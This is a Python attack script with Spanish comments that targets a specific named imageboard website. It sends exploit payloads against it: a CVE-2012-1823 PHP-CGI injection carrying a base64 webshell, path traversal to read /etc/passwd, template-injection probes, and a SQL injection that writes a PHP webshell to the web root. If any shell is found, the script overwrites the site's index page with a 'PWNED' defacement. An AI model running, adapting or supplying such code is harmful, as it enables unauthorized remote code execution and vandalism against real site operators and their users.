#!/usr/bin/env python3
import cloudscraper
import requests
import base64
from urllib.parse import urljoin, quote
import concurrent.futures
import time

print("""
██████╗ ██╗██████╗ ███████╗ ██████╗████████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
██║  ██║██║██████╔╝█████╗  ██║        ██║       ███████║   ██║      ██║   ███████║██║     █████╔╝ 
██║  ██║██║██╔══██╗██╔══╝  ██║        ██║       ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
██████╔╝██║██║  ██║███████╗╚██████╗   ██║       ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝       ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
""")

target = "https://hispachan.in/"
scraper = cloudscraper.create_scraper()

# Payload PHP para webshell
php_shell = "<?php system($_GET['c']); ?>"
php_shell_b64 = base64.b64encode(php_shell.encode()).decode()

# Ataques más directos y probables
attacks = [
    # CVE-2012-1823 - Más directo
    (f"{target}index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3ddata://text/plain;base64,{php_shell_b64}", "CVE-2012-1823"),
    (f"{target}?-s", "PHP Source Disclosure"),
    
    # Path traversal directo
    (f"{target}index.php?page=../../../../etc/passwd", "LFI"),
    (f"{target}?file=../../../etc/passwd", "LFI"),
    
    # SSTI directo
    (f"{target}?search={{{{7*7}}}}", "SSTI"),
    (f"{target}?q={{{{system('echo PWNED')}}}}", "SSTI RCE"),
    
    # SQLi directo
    (f"{target}?board=1' UNION SELECT '{php_shell}' INTO OUTFILE '/var/www/html/shell.php'--", "SQLi to Shell"),
    
    # Upload directo
    (f"{target}upload.php", "Upload endpoint"),
    (f"{target}post.php", "Post endpoint"),
]

print(f"[*] Target: {target}")
print("[*] Ejecutando ataques directos...\n")

def test_attack(attack_url, description):
    try:
        print(f"[*] Probando {description}: {attack_url[:60]}...")
        resp = scraper.get(attack_url, timeout=5)
        
        # Verificar indicadores de éxito
        if any(indicator in resp.text for indicator in ['root:', 'CVE-2012-1823-PWNED', '49', 'PWNED', '<?php']):
            print(f"[!!!] POSIBLE ÉXITO con {description}")
            return True
            
        if resp.status_code == 500:
            print(f"[!] Error 500 - posible vulnerabilidad en {description}")
            
    except Exception as e:
        pass
    return False

# Ejecutar ataques en paralelo para mayor velocidad
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(test_attack, url, desc) for url, desc in attacks]
    results = [f.result() for f in concurrent.futures.as_completed(futures)]

# Verificar shells creadas
print("\n[*] Verificando posibles shells...")
shell_names = ['shell.php', 'backdoor.php', 'pwned.php', 'cmd.php']

for shell in shell_names:
    try:
        shell_url = urljoin(target, shell)
        resp = scraper.get(shell_url + '?c=echo DIRECTATTACK', timeout=3)
        if 'DIRECTATTACK' in resp.text:
            print(f"[!!!] SHELL ENCONTRADA: {shell_url}")
            
            # Modificar el sitio inmediatamente
            print("[*] Modificando el sitio...")
            
            cmd = '''echo '<!DOCTYPE html><html><head><title>PWNED</title></head><body style="background:#000;color:#0f0;text-align:center;font-family:monospace;"><h1 style="font-size:100px;margin-top:200px;">HISPACHAN PWNED</h1><p>Direct Attack Successful</p></body></html>' > index.html'''
            
            scraper.get(f"{shell_url}?c={quote(cmd)}", timeout=5)
            
            print("\n[!!!] ATAQUE EXITOSO - SITIO MODIFICADO")
            exit(0)
    except:
        pass

print("\n[-] Los ataques directos no tuvieron éxito")
print("[*] El sitio puede tener protecciones adicionales o parches de seguridad")